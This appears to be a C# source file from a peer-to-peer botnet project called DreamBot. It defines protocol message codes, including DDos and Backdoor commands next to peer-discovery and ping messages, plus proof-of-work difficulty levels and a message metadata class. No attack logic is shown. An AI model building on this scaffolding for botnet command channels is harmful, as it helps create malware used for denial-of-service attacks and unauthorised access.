using System;
using DreamBot.Network.Protocol.Handlers;

namespace DreamBot.Network.Protocol.Messages
{
    public enum MessageType
    {
        Request,
        Reply,
        Special
    }

    public enum MessageCode : short
    {
        Hello = 0,
        HelloReply = 1,
        GetPeerList = 2,
        GetPeerListReply = 3,
        Ping = 4,
        Pong = 5,
        DDos = 6,
        Backdoor = 7,
        Unknown = 255
    }

    public enum Difficulty
    {
#if DEBUG
        NoWork = 0,
        Easiest= 0,
        Easy = 0,
        Medium = 0,
        Hard = 0,
        Hardest= 0
#else
        NoWork = 0,
        Easiest= 2,
        Easy = 8,   
        Medium = 10,
        Hard = 17,
        Hardest= 20
#endif
    }

    class MessageMetadata
    {
        public MessageCode MessageId { get; private set; }
        public Type Type { get; private set; }
        public IMessageHandler MessageHandler { get; private set; }
        public bool Encrypted { get; private set; }
        public MessageType MessageType { get; private set; }
        public int RequiredWork { get; set; }

        public MessageMetadata(MessageCode messageId, MessageType messageType, Type type, IMessageHandler messageHandler, bool encrypted, int requiredWork)
        {
            MessageId = messageId;
            Type = type;
            MessageType = messageType;
            MessageHandler = messageHandler;
            Encrypted = encrypted;
            RequiredWork = requiredWork;
        }
    }
}